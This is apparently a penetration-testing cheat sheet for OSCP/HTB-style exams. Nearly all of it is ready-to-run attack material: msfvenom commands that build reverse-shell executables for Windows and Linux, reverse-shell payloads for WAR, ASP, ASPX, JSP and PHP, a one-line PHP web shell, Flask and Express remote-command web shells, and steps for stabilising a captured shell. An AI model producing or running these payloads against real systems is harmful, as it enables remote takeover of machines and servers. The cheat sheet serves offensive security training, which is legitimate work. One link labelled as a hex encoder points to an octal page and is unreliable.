# Shells & Payloads Cheat Sheet

## Payload Structure – msfvenom

A **staged payload** is delivered in two parts:

* **Stage 1**: Small loader that establishes a connection
* **Stage 2**: Larger payload downloaded after connection

**Examples**

* `windows/shell_reverse_tcp` → **stageless**
* `windows/shell/reverse_tcp` → **staged**
* `linux/shell_reverse_tcp` → **stageless**
* `linux/shell/reverse_tcp` → **staged**

---

## Non‑Meterpreter Payloads (Binaries)

### Windows

**x86 staged**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**x64 staged**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

**x86 stageless**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**x64 stageless**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

### Linux

**x86 staged**

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

**x64 staged**

```bash
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

**x86 stageless**

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

**x64 stageless**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

---

## Web Payloads (Reverse Shells)

### Java WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### ASP

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### ASPX

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### PHP

```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

Alternative shells:

* pentestmonkey/php-reverse-shell
* windows-php-reverse-shell

---

## Simple Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>
```

### JSP

Use `cmdjsp.jsp` (fuzzdb webshell)

### ASP / ASPX

Use `cmdasp.asp` or `cmdasp.aspx`

---

## Framework‑Based Webshells

### Python (Flask)

```python
import os
from flask import Flask,request
app = Flask(__name__)
@app.route('/okay')
def cmd():
    return os.popen(request.args.get('c')).read()
app.run()
```

### NodeJS

```javascript
const express = require('express')
const { execSync } = require('child_process')
const app = express()
app.get('/okay/:cmd', (req,res)=>{
  res.send(execSync(req.params.cmd).toString())
})
app.listen(3000)
```

### Perl

```bash
locate perl-reverse-shell.pl
```

---

## Shell Stabilization

### Spawn TTY (Python)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Fully Interactive Shell

```bash
export TERM=xterm
/usr/bin/script -qc /bin/bash /dev/null
Ctrl+Z
stty raw -echo; fg
```

---

## Useful Tools

* Reverse Shell Generator: [https://www.revshells.com/](https://www.revshells.com/)
* CyberChef: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
* URL Encoder: [https://www.urlencoder.org/](https://www.urlencoder.org/)
* Octal Encoder: [http://www.unit-conversion.info/texttools/octal/](http://www.unit-conversion.info/texttools/octal/)
* Hex Encoder: [http://www.unit-conversion.info/texttools/octal/](http://www.unit-conversion.info/texttools/octal/)
* IP Converter: [https://www.silisoftware.com/tools/ipconverter.php](https://www.silisoftware.com/tools/ipconverter.php)

---

## Usage Notes

* Prefer **stageless** payloads for stability
* Avoid Meterpreter in restricted environments
* Web shells are ideal when execution is limited
* Always stabilize shells before privilege escalation

---

**OSCP / HTB / CRTO Ready Reference**
